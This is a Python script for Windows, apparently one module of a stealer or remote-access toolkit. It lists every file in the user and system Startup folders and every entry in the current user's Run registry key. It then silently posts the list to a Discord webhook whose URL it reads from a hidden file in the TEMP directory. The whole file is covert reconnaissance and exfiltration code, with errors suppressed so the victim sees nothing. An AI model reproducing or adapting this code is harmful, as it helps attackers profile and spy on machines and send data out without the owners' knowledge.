import os
import requests
import json
import winreg

webhook_path = os.path.join(os.environ.get('TEMP'), 'config', 'webhook.txt')

def get_webhook():
    try:
        with open(webhook_path, "r") as f:
            return f.read().strip()
    except Exception:
        return None

def get_startup_files():
    startup_files = []

    startup_folder = os.path.join(os.environ.get('APPDATA'), 'Microsoft\\Windows\\Start Menu\\Programs\\Startup')
    try:
        for file in os.listdir(startup_folder):
            file_path = os.path.join(startup_folder, file)
            if os.path.isfile(file_path):
                startup_files.append(file_path)
    except Exception:
        pass

    global_startup_folder = os.path.join(os.environ.get('PROGRAMDATA'), 'Microsoft\\Windows\\Start Menu\\Programs\\Startup')
    try:
        for file in os.listdir(global_startup_folder):
            file_path = os.path.join(global_startup_folder, file)
            if os.path.isfile(file_path):
                startup_files.append(file_path)
    except Exception:
        pass
    try:
        registry_key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run")
        i = 0
        while True:
            try:
                value = winreg.EnumValue(registry_key, i)
                startup_files.append(value[1])  # Valeur de la clé
                i += 1
            except OSError:
                break
        winreg.CloseKey(registry_key)
    except Exception:
        pass

    return startup_files

def send_to_discord(files):
    webhook = get_webhook()
    if not webhook:
        return
    
    chunk_size = 25
    chunks = [files[i:i + chunk_size] for i in range(0, len(files), chunk_size)]

    for index, chunk in enumerate(chunks):
        file_text = "\n".join(chunk)

        embed = {
            "title": f"📝 Fichiers en Startup (Partie {index + 1})",
            "description": f"Nombre total de fichiers : {len(files)}\n\n```{file_text}```",
            "color": 16711680,
        }

        data = {
            "embeds": [embed]
        }

        headers = {"Content-Type": "application/json"}

        try:
            requests.post(webhook, data=json.dumps(data), headers=headers)
        except Exception:
            pass

startup_files = get_startup_files()
if startup_files:
    send_to_discord(startup_files)
